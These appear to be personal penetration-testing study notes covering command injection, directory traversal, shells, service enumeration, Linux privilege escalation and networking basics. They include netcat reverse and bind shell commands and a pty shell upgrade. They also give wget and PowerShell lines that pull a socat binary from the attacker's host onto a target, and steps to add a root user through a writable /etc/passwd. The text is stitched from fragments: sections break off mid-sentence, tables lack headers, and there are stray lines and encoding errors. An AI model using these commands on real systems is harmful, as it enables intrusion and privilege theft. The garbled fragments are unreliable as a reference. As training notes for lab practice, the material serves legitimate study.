# OS command injection

  
OS command injection is one of the most powerful vulnerability with
**“High Severity having a CVSS Score of 8”**  
  
OS command injection (also known as shell injection) is a web security
vulnerability that allows an attacker to execute arbitrary operating
system (OS) commands on the server that is running an application, and
typically fully compromise the application and all its data.  
  
**

## Executing arbitrary commands:

• S0me 3xtra  
◇ |  
\# Types of Command Injection  
**Error based injection:** When an attacker injects a command through an
input parameter and the output of that command is displayed on the
certain web page, it proves that the application is vulnerable to the
command injection. The displayed result might be in the form of an error
or the actual outcomes of the command that you tried to run. An attacker
then modifies and adds additional commands depending on the shell the
webserver and assembles information from the application.  
**Blind based Injection:** The results of the commands that you inject
will not be displayed to the attacker and no error messages are
returned. The attacker might use another technique to identify whether
the command was really executed on the server or not.  
  
  

### Steps to exploit – OS Command Injection

  
Step 1: Identify the input field  
Step 2: Understand the functionality  
Step 3: Try the Ping method time delay  
Step 4: Use various operators to exploit OS Command Injection

# Directory Traversal

  

## What is directory traversal?

  
Directory traversal (also known as file path traversal) is a web
security vulnerability that allows an attacker to read arbitrary files
on the server that is running an application. This might include
application code and data, credentials for back-end systems, and
sensitive operating system files. In some cases, an attacker might be
able to write to arbitrary files on the server, allowing them to
modify  
application data or behavior, and ultimately take full control of the
server.  
  
• Unix-like OS:◇ root directory: `/`  
◇ directory separator: `/`  
  
  
• Windows OS:◇ root directory: `<drive letter>:`  
◇ directory separator: `\` or `/`  
  
  
• Classic macOS:◇ root directory: `<drive letter>:`  
◇ directory separator: `:`

# Content Discovery

  
Firstly, we should ask, in the context of web application security, what
is content? Content can be many things, a file, video, picture, backup,
a website feature. When we talk about content discovery, we're not
talking about the obvious things we can see on a website; it's the
things that aren't immediately presented to us and that weren't always
intended for public access.

• Wayback machine (<https://archive.org/web/>)  
• S3 buckets  
◇ S3 Buckets are a storage service provided by Amazon AWS, allowing
people to save files and even static website content in the cloud
accessible over HTTP and HTTPS. The owner of the files can set access
permissions to either make files public, private and even writable.
Sometimes these access permissions are incorrectly set and inadvertently
allow access to files that shouldn't be available to the public. The
format of the S3 buckets is
http(s)://**{name}.**[s3.amazonaws.com](http://s3.amazonaws.com/) where
{name} is decided by the owner, such
as [tryhackme-assets.s3.amazonaws.com](http://tryhackme-assets.s3.amazonaws.com).
S3 buckets can be discovered in many ways, such as finding the URLs in
the website's page source, GitHub repositories, or even automating the
process. One common automation method is by using the company name
followed by common terms such as

# Threat Modeling and Incident Response

  

# Info

  
Threat modelling is the process of reviewing, improving, and testing the
security protocols in place in an organisation's information technology
infrastructure and services.  
  
The threat modelling process is very similar to a risk assessment made
in workplaces for employees and customers. The principles all return
to:  
• Preparation  
• Identification  
• Mitigations  
• Review  
  
  
  
It is, however, a complex process that needs constant review and
discussion with a dedicated team. An effective threat model includes:  
• Threat intelligence  
• Asset identification  
• Mitigation capabilities  
• Risk assessment  
  

# Shells

  
**<span style="text-decoration:underline;">Socat:</span>**  
Socat is like netcat on steroids. It can do all of the same things, and
*many* more. Socat shells are usually more stable than netcat shells out
of the box. In this sense it is vastly superior to netcat; however,
there are two big catches:  
1. The syntax is more difficult  
2. Netcat is installed on virtually every Linux distribution by default.
Socat is very rarely installed by default.  
There are work arounds to both of these problems, which we will cover
later on.  
Both Socat and Netcat have .exe versions for use on Windows.  
  
Aside from the tools we've already covered, there are some repositories
of shells in many different languages. One of the most prominent of
these is [Payloads all the
Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).
The PentestMonkey [Reverse Shell
Cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
is also commonly used. In addition to these online resources, Kali Linux
also comes pre-installed with a variety of webshells located at
`/usr/share/webshells`. The [SecLists
repo](https://github.com/danielmiessler/SecLists), though primarily used
for wordlists, also contains some very useful code for obtaining
shells.  
  
  
Netcat  
------------------------------  
Reverse Shell  
==========  
`nc -lvnp <port-number>`  
• **-l** is used to tell netcat that this will be a listener  
• **-v** is used to request a verbose output  
• **-n** tells netcat not to resolve host names or use DNS. Explaining
this is outwith the scope of the room.  
• **-p** indicates that the port specification will follow.  
  
Bind Shell  
==========  
`nc <target-ip> <chosen-port>`  
  
Shell Upgrading  
=========  
*<span style="text-decoration:underline;">Technique 1: Python  
</span>*  
The first technique we'll be discussing is applicable only to Linux
boxes, as they will nearly always have Python installed by default. This
is a three stage process:  
1. The first thing to do is use
`python -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to
spawn a better featured bash shell; note that some targets may need the
version of Python specified. If this is the case, replace `python` with
`python2` or `python3` as required. At this point our shell will look a
bit prettier, but we still won't be able to use tab autocomplete or the
arrow keys, and Ctrl + C will still kill the shell.  
2. Step two is: `export TERM=xterm` -- this will give us access to term
commands such as `clear`.  
3. Finally (and most importantly) we will background the shell using
Ctrl + Z. Back in our own terminal we use `stty raw -echo; fg`. This
does two things: first, it turns off our own terminal echo (which gives
us access to tab autocompletes, the arrow keys, and Ctrl + C to kill
processes). It then foregrounds the shell, thus completing the
process.  
  
  
*<span style="text-decoration:underline;">Technique 2: rlwrap</span>*  
rlwrap is a program which, in simple terms, gives us access to history,
tab autocompletion and the arrow keys immediately upon receiving a
shell*;* however, s*ome* manual stabilisation must still be utilised if
you want to be able to use Ctrl + C inside the shell. rlwrap is not
installed by default on Kali, so first install it with
`sudo apt install rlwrap`.  
To use rlwrap, we invoke a slightly different listener:  
`rlwrap nc -lvnp <port>`  
  
Prepending our netcat listener with "rlwrap" gives us a much more fully
featured shell. This technique is particularly useful when dealing with
Windows shells, which are otherwise notoriously difficult to stabilise.
When dealing with a Linux target, it's possible to completely stabilise,
by using the same trick as in step three of the previous technique:
background the shell with Ctrl + Z, then use `stty raw -echo; fg` to
stabilise and re-enter the shell.  
  
  
 *<span style="text-decoration:underline;">Technique 3: Socat</span>*  
  
The third easy way to stabilise a shell is quite simply to use an
initial netcat shell as a stepping stone into a more fully-featured
socat shell. Bear in mind that this technique is limited to Linux
targets, as a Socat shell on Windows will be no more stable than a
netcat shell. To accomplish this method of stabilisation we would first
transfer a [socat static compiled
binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)
(a version of the program compiled to have no dependencies) up to the
target machine. A typical way to achieve this would be using a webserver
on the attacking machine inside the directory containing your socat
binary (`sudo python3 -m http.server 80`), then, on the target machine,
using the netcat shell to download the file. On Linux this would be
accomplished with curl or wget
(`wget <LOCAL-IP>/socat -O /tmp/socat`).  
For the sake of completeness: in a Windows CLI environment the same can
be done with Powershell, using either Invoke-WebRequest or a webrequest
system class, depending on the version of Powershell installed
(`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`).
We will cover the syntax for sending and receiving shells with Socat in
the upcoming tasks.  

# Service Enumeration

  

# Telnet

  
**What is Telnet?**  
Telnet is an application protocol which allows you, with the use of a
telnet client, to connect to and execute commands on a remote machine
that's hosting a telnet server.  
  
The telnet client will establish a connection with the server. The
client will then become a virtual terminal- allowing you to interact
with the remote host.  
  
**Replacement**  
  
Telnet sends all messages in clear text and has no specific security
mechanisms. Thus, in many applications and services, Telnet has been
replaced by SSH in most implementations.  
   
**How does Telnet work?**  
The user connects to the server by using the Telnet protocol, which
means entering **"telnet"** into a command prompt. The user then
executes commands on the server by using specific Telnet commands in the
Telnet prompt. You can connect to a telnet server with the following
syntax: **"telnet \[ip\] \[port\]"**

# SMTP

  
**What is SMTP?**  
------------------------  
SMTP stands for "Simple Mail Transfer Protocol". It is utilised to
handle the sending of emails. In order to support email services, a
protocol pair is required, comprising of SMTP and POP/IMAP. Together
they allow the user to send outgoing mail and retrieve incoming mail,
respectively.  
The SMTP server performs three basic functions:  
  
•  It verifies who is sending emails through the SMTP server.  
•  It sends the outgoing mail  
•  If the outgoing mail can't be delivered it sends the message back to
the sender  
  
Most people will have encountered SMTP when configuring a new email
address on some third-party email clients, such as Thunderbird; as when
you configure a new email client, you will need to configure the SMTP
server configuration in order to send outgoing emails.  
  
**POP and IMAP**  
---------------------------  
POP, or "Post Office Protocol" and IMAP, "Internet Message Access
Protocol" are both email protocols who are responsible for the transfer
of email between a client and a mail server. The main differences is in
POP's more simplistic approach of downloading the inbox from the mail
server, to the client. Where IMAP will synchronise the current inbox,
with new mail on the server, downloading anything new. This means that
changes to the inbox made on one computer, over IMAP, will persist if
you then synchronise the inbox from another computer. The POP/IMAP
server is responsible for fulfiling this process.  
  
**How does SMTP work?**  
------------------------------------  
Email delivery functions much the same as the physical mail delivery
system. The user will supply the email (a letter) and a service (the
postal delivery service), and through a series of steps- will deliver it
to the recipients inbox (postbox). The role of the SMTP server in this
service, is to act as the sorting office, the email (letter) is picked
up and sent to this server, which then directs it to the recipient.  
  
[![](../_resources/186-1.png)]()  
  
1. The mail user agent, which is either your email client or an external
program. connects to the SMTP server of your domain, e.g.
smtp.google.com. This initiates the SMTP handshake. This connection
works over the SMTP port- which is usually 25. Once these connections
have been made and validated, the SMTP session starts.  
  
2. The process of sending mail can now begin. The client first submits
the sender, and recipient's email address- the body of the email and any
attachments, to the server.  
  
3. The SMTP server then checks whether the domain name of the recipient
and the sender is the same.  
4. The SMTP server of the sender will make a connection to the
recipient's SMTP server before relaying the email. If the recipient's
server can't be accessed, or is not available- the Email gets put into
an SMTP queue.  
  
5. Then, the recipient's SMTP server will verify the incoming email. It
does this by checking if the domain and user name have been recognised.
The server will then forward the email to the POP or IMAP server, as
shown in the diagram above.  
  
6. The E-Mail will then show up in the recipient's inbox.

**Enumerating Server Details**  
----------------------------------------------  
Poorly configured or vulnerable mail servers can often provide an
initial foothold into a network, but prior to launching an attack, we
want to fingerprint the server to make our targeting as precise as
possible. We're going to use the "*smtp\_version*" module in MetaSploit
to do this. As its name implies, it will scan a range of IP addresses
and determine the version of any mail servers it encounters.  
  
**Alternatives**  
It's worth noting that this enumeration technique will work for the
majority of SMTP configurations; however there are other, non-metasploit
tools such as smtp-user-enum that work even better for enumerating
OS-level user accounts on Solaris via the SMTP service. Enumeration is
performed by inspecting the responses to VRFY, EXPN, and RCPT TO
commands.  
This technique could be adapted in future to work against other
vulnerable SMTP daemons, but this hasnâ€™t been done as of the time of
writing.  
  

# It's an alternative that's worth keeping in mind if you're trying to distance yourself from using Metasploit e.g. in preparation for OSCP.

# SMB - Samba

  
Server Messege Block - SMB  
◇ A file sharing protocol  
◇ Application layer protocol  
▪ read and write permissions  
◇ Runs on the top of TCP/IP  
▪ The communication between clients and servers is done with the help of
something called SMB client request.  
  
**What is SMB?**  
SMB - Server Message Block Protocol - is a client-server communication
protocol used for sharing access to files, printers, serial ports and
other resources on a network.
\[[source](https://searchnetworking.techtarget.com/definition/Server-Message-Block-Protocol)\]  
  
Servers make file systems and other resources (printers, named pipes,
APIs) available to clients on the network. Client computers may have
their own hard disks, but they also want access to the shared file
systems and printers on the servers.  
The SMB protocol is known as a response-request protocol, meaning that
it transmits multiple messages between the client and server to
establish a connection. Clients connect to servers using TCP/IP
(actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002),
NetBEUI or IPX/SPX.  
  
**What runs SMB?**  
Microsoft Windows operating systems since Windows 95 have included
client and server SMB protocol support. Samba, an open source server
that supports the SMB protocol, was released for Unix systems

## Introduction

  
FTP is a network protocol used to transfer files from a server to a
client over a network. FTP servers can be accessed either via the ftp
command-line tool or via third-party applications such as
[FileZilla](https://filezilla-project.org/). This service runs on port
21 by default.  
  
**What is FTP?**  
File Transfer Protocol (FTP) is, as the name suggests , a protocol used
to allow remote transfer of files over a network. It uses a
client-server model to do this, and- as we'll come on to later- relays
commands and data in a very efficient way.  
  
**How does FTP work?**  
A typical FTP session operates using two channels: • a command
(sometimes called the control) channel  
• a data channel.  
  
As their names imply, the command channel is used for transmitting
commands as well as replies to those commands, while the data channel is
used for transferring data.  
FTP operates using a client-server protocol. The client initiates a
connection with the server, the server validates whatever login
credentials are provided and then opens the session.  
While the session is open, the client may execute FTP commands on the
server.  
  
**Active vs Passive**  
The FTP server may support either Active or Passive connections, or
both.   
◇ In an Active FTP connection, the client opens a port and listens. The
server is required to actively connect to it.   
◇ In a Passive FTP connection, the server opens a port and listens
(passively) and the client connects to it.   
  
This separation of command information and data into separate channels
is a way of being able to send commands to the server without having to
wait for the current data transfer to finish. If both channels were
interlinked, you could only enter commands in between data transfers,
which wouldn't be efficient for either large file transfers, or slow
internet connections.  
  
**More Details:**  
You can find more details on the technical function, and implementation
of, FTP on the Internet Engineering Task Force website:
<https://www.ietf.org/rfc/rfc959.txt>. The IETF is one of a number of
standards agencies, who define and regulate internet standards.

# 101

  

# x86

  
• The x86 is little-endian architecture based on the Intel 8086
processor.  
• i**t can operate in two modes: real and protected.**  
• Real mode is the processor state when it is fi rst powered on and only
supports a 16-bit instruction set.  
• Protected mode is the processor state supporting virtual memory,
paging, and other features; it is the state in which modern operating
systems execute.  
• x86 supports the concept of privilege separation through an
abstraction called ring level.  
• **The processor supports four ring levels, numbered from 0 to 3.
(Rings 1 and 2 are not commonly used so they are not discussed here.)
Ring 0 is the highest privilege level and can modify all system
settings. Ring 3 is the lowest privileged level and can only read/modify
a subset of system settings.**  
• *The ring level is encoded in the CS register and sometimes referred
to as the current privilege level (CPL) in offi cial documentation.*  
•  

# Registers

  
When operating in protected mode, the x86 architecture has eight 32-bit
general-  
purpose registers (GPRs):  
• EAX ,  
• EBX ,  
• ECX ,  
• EDX ,  
• EDI ,  
• ESI ,

WHOIS is a request and response protocol that follows the [RFC

server listens on TCP port 43 for incoming requests. The domain
registrar is responsible for maintaining the WHOIS records for the
domain names it is leasing. The WHOIS server replies with various
information related to the domain requested. Of particular interest, we
can learn:  
• Registrar: Via which registrar was the domain name registered?  
• Contact info of registrant: Name, organization, address, phone, among
other things. (unless made hidden via a privacy service)  
• Creation, update, and expiration dates: When was the domain name first
registered? When was it last updated? And when does it need to be
renewed?  
• Name Server: Which server to ask to resolve the domain name?

# nslookup and dig

  
Find the IP address of a domain name using `nslookup`, which stands for
Name Server Look Up. You need to issue the command
`nslookup DOMAIN_NAME`, for example, `nslookup tryhackme.com`. Or, more
generally, you can use `nslookup OPTIONS DOMAIN_NAME SERVER`. These
three main parameters are:  
• OPTIONS contains the query type as shown in the table below. For
instance, you can use `A` for IPv4 addresses and `AAAA` for IPv6
addresses.  
• DOMAIN\_NAME is the domain name you are looking up.  
• SERVER is the DNS server that you want to query. You can choose any
local or public DNS server to query. Cloudflare offers `1.1.1.1` and
`1.0.0.1`, Google offers `8.8.8.8` and `8.8.4.4`, and Quad9 offers
`9.9.9.9` and `149.112.112.112`. There are many [more public DNS
servers](https://duckduckgo.com/?q=public+dns) that you can choose from
if you want alternatives to your ISPâ€™s DNS servers.

For more advanced DNS queries and additional functionality, you can use
`dig`, the acronym for “Domain Information Groper,” if you are curious.
Let’s use `dig` to look up the MX records and compare them to
`nslookup`. We can use `dig DOMAIN_NAME`, but to specify the record
type, we would use `dig DOMAIN_NAME TYPE`. Optionally, we can select the
server we want to query using `dig @SERVER DOMAIN_NAME TYPE`.  
• SERVER is the DNS server that you want to query.  
• DOMAIN\_NAME is the domain name you are looking up.  
• TYPE contains the DNS record type, as shown in the table provided
earlier.

# Privilege Escalation

  

# Windows

  

# Priv Esc

  
**What does "privilege escalation" mean?**  
  
At it's core, Privilege Escalation usually involves going from a lower
permission to a higher permission. More technically, it's the
exploitation of a vulnerability, design flaw or configuration oversight
in an operating system or application to gain unauthorized access to
resources that are usually restricted from the users.  
  
**Why is it important?**  
Rarely when doing a CTF or real-world penetration test, will you be able
to gain a foothold (initial access) that affords you administrator
access. Privilege escalation is crucial, because it lets you gain system
administrator levels of access. This allow you to do many things,
including:  
•  Reset passwords  
  
•  Bypass access controls to compromise protected data  
•  Edit software configurations  
•  Enable persistence, so you can access the machine again later.  
•  Change privilege of users  
•  Get that cheeky root flag ;)  
  
**There are two main privilege escalation variants:**  
**Horizontal¬†privilege escalation:** This is where you expand your
reach over the compromised system by taking over a different user who is
on the same privilege level as you. For instance, a normal user
hijacking another normal user (rather than elevating to super user).
This allows you to inherit whatever files and access that user has. This
can be used, for example, to gain access to another normal privilege
user, that happens to have an SUID file attached to their home directory
(more on these later) which can then be used to get super user access.
\[Travel sideways on the tree\]  
  
**Vertical¬†privilege escalation (privilege elevation):** This is where
you attempt to gain higher privileges or access, with an existing
account that you have already compromised. For local privilege
escalation attacks this might mean hijacking an account with
administrator privileges or root privileges. \[Travel up on the tree\]

# SUID/GD Bin Exploitation

  

# /ete/passwd

  
**Understanding /etc/passwd**  
The /etc/passwd file stores essential information, which  is required
during login. In other words, it stores user account information. The
/etc/passwd is a **plain text file**. It contains a list of the system’s
accounts, giving for each account some useful information like user ID,
group ID, home directory, shell, and more.  
The /etc/passwd file should have general read permission as many command
utilities use it to map user IDs to user names. However, write access to
the /etc/passwd must only limit for the superuser/root account. When it
doesn't, or a user has erroneously been added to a write-allowed group.
We have a vulnerability that can allow the creation of a root user that
we can access.  
  
**Understanding /etc/passwd format**  
The /etc/passwd file contains one entry per line for each user (user
account) of the system. All fields are separated by a colon : symbol.
Total of seven fields as follows. Generally, /etc/passwd file entry
looks as follows:  
    test:x:0:0:root:/root:/bin/bash  
\[as divided by colon (:)\]  
  
1. **Username**: It is used when user logs in. It should be between 1
and 32 characters in length.  
2. **Password**: An x character indicates that encrypted password is
stored in /etc/shadow file. Please note that you need to use the passwd
command to compute the hash of a password typed at the CLI or to
store/update the hash of the password in /etc/shadow file, in this case,
the password hash is stored as an "x".  
  
3. **User ID (UID)**: Each user must be assigned a user ID (UID). UID 0
(zero) is reserved for root and UIDs 1-99 are reserved for other
predefined accounts. Further UID 100-999 are reserved by system for
administrative and system accounts/groups.  
4. **Group ID (GID)**: The primary group ID (stored in /etc/group
file)  
5. **User ID Info**: The comment field. It allow you to add extra
information about the users such as user’s full name, phone number etc.
This field use by finger command.  
6. **Home directory**: The absolute path to the directory the user will
be in when they log in. If this directory does not exists then users
directory becomes /  
7. **Command/shell**: The absolute path of a command or shell
(/bin/bash). Typically, this is a shell. Please note that it does not
have to be a shell.  
  
  
**Exploiting a writable /etc/passwd**  
step 1: create hashed password using salt  
openssl passwd -1 -salt \[salt\]  
step 2: Write the credential in passwd file  
format: username:passwordhash:0:0:root:/root:/bin/bash  
step 3: Save

# Finding files,services,programs with SUID

  
As we all know in Linux everything is a file, including directories and
devices which have permissions to allow or restrict three operations
i.e. read/write/execute. So when you set permission for any file, you
should be aware of the Linux users to whom you allow or restrict all
three permissions.  
  
when special permission is given to each user it becomes SUID or SGID.
When extra bit **“4”** is set to user(Owner) it becomes **SUID** (Set
user ID) and when bit **“2”** is set to group it becomes **SGID** (Set
Group ID).  
  
Therefore, the permissions to look for when looking for SUID is:  
SUID:  
rws-rwx-rwx  
GUID:  
rwx-rws-rwx  
  
  
Search for files which have read and write permission for their owner
and group, and which other users can read,  
without regard to the presence of any extra permission bits (for example
the executable bit).  
  
$ find . -perm -664  
  
This will match a file which has mode 0777, for example.  
  
find file which can be read by other users  
except owner,group,others  
  
find / -user root -perm /4000 2&gt; /dev/null  
^ ^-----------------^  
| ^  
| |\_\_\_\_\_\_\_\_\_\_\_\_ ignores all the output that doesn't match  
| the condition  
|\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_ suid | 2000 sgid  
  
`find / -perm -u=s -type f 2>/dev/null`  
**Finding SUID Binaries**  
  
We already know that there is SUID capable files on the system, thanks
to our LinEnum scan. However, if we want to do this manually we can use
the command: **"find / -perm -u=s -type f 2&gt;/dev/null"** to search
the file system for SUID/GUID files. Let's break down this command.  
**find** - Initiates the "find" command  
  
**/** - Searches the whole file system  
  
**-perm** - searches for files with specific permissions  
  
**-u=s** - Any of the permission bits *mode* are set for the file.
Symbolic modes are accepted in this form  
**-type f** - Only search for files  
  
**2&gt;/dev/null** - Suppresses errors

will be interacting with the application as if it were a black-box
scenario and then using their knowledge of the application to try and
resolve issues as they find them. With Grey-Box testing, the limited
knowledge given saves time, and is often chosen for extremely
well-hardened attack surfaces.</td>

software developer who knows programming and application logic. The
tester will be testing the internal components of the application or
piece of software and, for example, ensuring that specific functions
work correctly and within a reasonable amount of time. The tester will
have full knowledge of the application and its expected behaviour and is
much more time consuming than black-box testing. The full knowledge in a
White-Box testing scenario provides a testing approach that guarantees
the entire attack surface can be validated.</td>

# Security Principles and Frameworks

  
**

# CIA Triads

  
  
***Confidentiality, Integrity, and Availability (CIA) is the opposite of
Disclosure, Alternation, and Destruction (DAD).***  
  

## Confidentiality

  
This element is the protection of data from unauthorized access and
misuse. Organisations will always have some form of sensitive data
stored on their systems. To provide confidentiality is to protect this
data from parties that it is not intended for.  
  
  

## Integrity

  
The CIA triad element of integrity is the condition where information is
kept accurate and consistent unless authorized changes are made. It is
possible for the information to change because of careless access and
use, errors in the information system, or unauthorized access and use.
In the CIA triad, integrity is maintained when the information remains
unchanged during storage, transmission, and usage not involving
modification to the information. Steps must be taken to ensure data
cannot be altered by unauthorised people (for example, in a breach of
confidentiality).  
  
  

## Availability

  
In order for data to be useful, it must be available and accessible by
the user.  
Availability is very often a key benchmark for an organisation. For
example, having 99.99% uptime on their websites or systems (this is laid
out in Service Level Agreements). When a system is unavailable, it often
results in damage to an organisations reputation and loss of finances.
Availability is achieved through a combination of many elements,
including:  
  
• Having reliable and well-tested hardware for their information
technology servers (i.e. reputable servers)  
• Having redundant technology and services in the case of failure of the
primary  
• Implementing well-versed security protocols to protect technology and
services from attack  
  
**

## Principle of Priviliege

  
  
The levels of access given to individuals are determined on two primary
factors:  
• The individual's role/function within the organisation  
• The sensitivity of the information being stored on the system  
  
Two key concepts are used to assign and manage the access rights of
individuals, two key concepts are used: Privileged Identity Management
(PIM) and Privileged Access Management (or PAM for short).

***Types of Personal Data:***  
◇ ***Volunteered data:*** Created and shared explicitly by individuals
i.e social media  
◇ ***Observed Data:*** Captured by recording the actions of
individuals.  
◇ ***Inferred Data:*** Data based on the volunteered data or observed
data.  
  
***Bit:*** Binary digit  
  
***Methods of data transmission:***  
◇ Electronical signal  
◇ Optical signal  
◇ Wireless signal  
  
  
***Bandwidth:***  
Bandwidth is the capacity of a medium to carry data.  
The maximum amount of data transmitted over an internet connection in a
given amount of time.  
  
→ Bandwidth is often mistaken for internet speed when it's actually the
volume of information that can be sent over a connection in a measured
amount of time – calculated in megabits per second (Mbps).  
  
  
  

### Bandwidth vs Speed

  
Bandwidth is how much information you receive every second, while speed
is how fast that information is received or downloaded. Let's compare it
to filling a bathtub. If the bathtub faucet has a wide opening, more
water can flow at a faster rate than if the pipe was narrower. Think of
the water as the bandwidth and the rate at which the water flows as the
speed  
  
  

### Bandwidth vs Latency

  
Latency is sometimes referred to as delay or ping rate. It's the lag you
experience while waiting for something to load. If bandwidth is the
amount of information sent per second, latency is the amount of time it
takes that information to get from its source to you.  
  
  

### Bandwidth vs Throughput

  
Throughput is how much information actually gets delivered in a certain
amount of time. So if bandwidth is the max amount of data, throughput is
how much of that data makes it to its destination – taking latency,
network speed, packet loss and other factors into account.  
  
***Types of Servers:***  
◇ Email server  
◇ Web  
◇ File  
  
***P2P:***  
In small businesses and homes, many computers function as the servers
and clients on the network. This type of network is called a
peer-to-peer (P2P) network.  
  
***Network Infrastructure:***  
The network infrastructure contains three categories of hardware
components  
  
→ End devices  
→ Intermediate Devices : Wireless routers, lan switch, firewall etc  
→ Network media  
  
***Types of Wireless Networks:***  
→ GSM : Global system of mobile communication  
→ GPS  
→ Wifi  
→ Bluetooth  
→ NFC  
→  
◇ A hotspot is an area where Wi-Fi signals are available  
◇  
◇ How Cell phone network works?  
→ Mobile phones use radio waves to transmit voice signals to antennas
mounted on towers located in specific geographic areas. Mobile phones
are often referred to as “cell phones” because the geographic area in
which an individual tower can provide a signal to a phone is called a
cell. When a telephone call is made, the voice signal is relayed from
one tower to another tower until it is delivered to its destination.
This type of network is used when you make a phone call to another
mobile phone or to a wired telephone. It is also used to send text
messages directly from the phone. The most common type of cellular
telephone network is called a GSM network, an abbreviation of the title
“Global System for Mobile Communications”.  
  
In addition to smart phones and mobile devices, there are many other
components that can be part of a local area network. Some examples of
network components are personal computers, servers, networking devices,
and cabling. These components can be grouped into four main
categories:  
• Hosts  
• Peripherals  
• Network devices  
• Network media  
  
  
• The term network media describes the cables and wires used in wired
networks, along with radio frequency waves used in wireless networks.
These wired and wireless networks provide the paths over which messages
travel between the various network components.  
• Some devices can play more than one role, depending on how they are
connected. For example, a printer that is directly connected to a host
(local printer) is a peripheral. A printer that is directly connected to
a network device and participates directly in network communications is
a host.

# Packets

  
• What is a packet ?  
◇ Packets and frames are small pieces of data that, when forming
together, make a larger piece of information or message  
  
• However, they are two different things in the OSI model. A frame is at
layer 2 - the data link layer, meaning there is no such information as
IP addresses. Think of this as putting an envelope within an envelope
and sending it away. The first envelope will be the packet that you
mail, but once it is opened, the envelope within still exists and
contains data (this is a frame).  
  
• A packet using this protocol will have a set of headers that contain
additional pieces of information to the data that is being sent across a
network.  
◇ Some notable headers include:  

<table class="table">
<thead>
<tr class="header">
<th>Header</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Time to Live</td>
<td>This field sets an expiry timer for the packet to not clog up your
network if it never manages to reach a host or escape!</td>
</tr>
<tr class="even">
<td>Checksum</td>
<td>This field provides integrity checking for protocols such as TCP/IP.
If any data is changed, this value will be different from what was
expected and therefore corrupt.</td>
</tr>
<tr class="odd">
<td>Source Address</td>
<td>The IP address of the device that the packet is being sent fromĀ so
that data knows where to return to.</td>
</tr>
<tr class="even">
<td>Destination Address</td>
<td>The device's IP address the packet is being sent to so that data
knows where to travel next.</td>
</tr>
</tbody>
</table>

  
  
  
Very similar to how the OSI model works, information is added to each
layer of the TCP model as the piece of data (or packet) traverses it. As
you may recall, this process is known as encapsulation - where the
reverse of this process is decapsulation.  
  
  
One defining feature of TCP is that it is **connection-based**, which
means that TCP must establish a connection between both a client and a
device acting as a server **before** data is sent.  
  
  
Because of this, TCP guarantees that any data sent will be received on
the other end. This process is named the Three-way handshake, which is
something we'll come on to discuss shortly. <span class="small">A table
comparing the advantages and disadvantages of TCP is located
below:</span>  
  
  

<table class="table">
<thead>
<tr class="header">
<th>Advantages of TCP</th>
<th>Disadvantages of TCP.</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Guarantees the integrity of data.</td>
<td>Requires a reliable connection between the two devices. If one small
chunk of data is not received, then the entire chunk of data cannot be
used and must be re-sent.</td>
</tr>
<tr class="even">
<td>Capable of synchronising two devices to prevent each other from
being flooded with data in the wrong order.</td>
<td>A slow connection can bottleneck another device as the connection
will be reserved on the other device the whole time.</td>
</tr>
<tr class="odd">
<td>Performs a lot more processes for reliability</td>
<td>TCP is significantly slower than UDP because more work (computing)
has to be done by the devices using this protocol.</td>
</tr>
</tbody>
</table>

  
  
  
TCP packets contain various sections of information known as headers
that are added from encapsulation. Let's explain some of the crucial
headers in the table below:  
  
  

<table class="table">
<thead>
<tr class="header">
<th>Header</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Source Port</td>
<td>This value is the port opened by the sender to send the TCP packet
from. This value is chosen randomly (out of the ports from 0-65535 that
aren't already in use at the time).</td>
</tr>
<tr class="even">
<td>Destination Port</td>
<td>This value is the port number that an application or service is
running on the remote host (the one receiving data); for example, a
webserver running on port 80. Unlike the source port, this value is not
chosen at random.</td>
</tr>
<tr class="odd">
<td>Source IP</td>
<td>This is the IP address of the device that is sending the
packet.</td>
</tr>
<tr class="even">
<td>Destination IP</td>
<td>This is the IP address of the device that the packet is destined
for.</td>
</tr>
<tr class="odd">
<td>Sequence Number</td>
<td>When a connection occurs, the first piece of data transmitted is
given a random number. We'll explain this more in-depth further on.</td>
</tr>
<tr class="even">
<td>Acknowledgement Number</td>
<td>After a piece of data has been given a sequence number, the number
for the next piece of data will have the sequence number + 1. We'll also
explain this more in-depth further on.</td>
</tr>
<tr class="odd">
<td>Checksum</td>
<td>This value is what gives TCP integrity. A mathematical calculation
is made where the output is remembered. When the receiving device
performs the mathematicalĀ calculation, the data must be corrupt if the
output is different from what was sent.</td>
</tr>
<tr class="even">
<td>Data</td>
<td>This header is where the data, i.e. bytes of a file that is being
transmitted, is stored.</td>
</tr>
<tr class="odd">
<td>Flag</td>
<td>This header determines how the packet should be handled by either
device during the handshake process. Specific flags will determine
specific behaviours, which is what we'll come on to explain below.</td>
</tr>
</tbody>
</table>

  
  
  
Next, we'll come on to discuss the *Three-way handshake - *the term
given for the process used to establish a connection between two
devices. <span class="small">The Three-way handshake communicates using
a few special messages - the table below highlights the main

the two devices together (we'll explain this further later on).</td>
</tr>
<tr class="even">
<td>2</td>
<td>SYN/ACK</td>
<td>This packet is sent by the receiving device (server) to acknowledge
the synchronisation attempt from the client.</td>
</tr>
<tr class="odd">
<td>3</td>
<td>ACK</td>
<td>The acknowledgement packet can be used by either the client or
server to acknowledge that a series of messages/packets have been
successfully received.</td>
</tr>
<tr class="even">
<td>4</td>
<td>DATA</td>
<td>Once a connection has been established, data (such as bytes of a
file) is sent via the "DATA" message.</td>
</tr>
<tr class="odd">
<td>5</td>
<td>FIN</td>
<td>This packet is used to cleanly (properly) close the connection after
it has been complete.</td>
</tr>
<tr class="even">
<td>#</td>
<td>RST</td>
<td>This packet abruptly ends all communication. This is the last resort
and indicates there was some problem during the process. For example, if
the service or application is not working correctly, or the system has
faults such as low resources.</td>
</tr>
</tbody>
</table>

  
  
Any sent data is given a random number sequence and is reconstructed
using this number sequence and incrementing by 1. Both computers must
agree on the same number sequence for data to be sent in the correct
order. This order is agreed upon during three steps:  
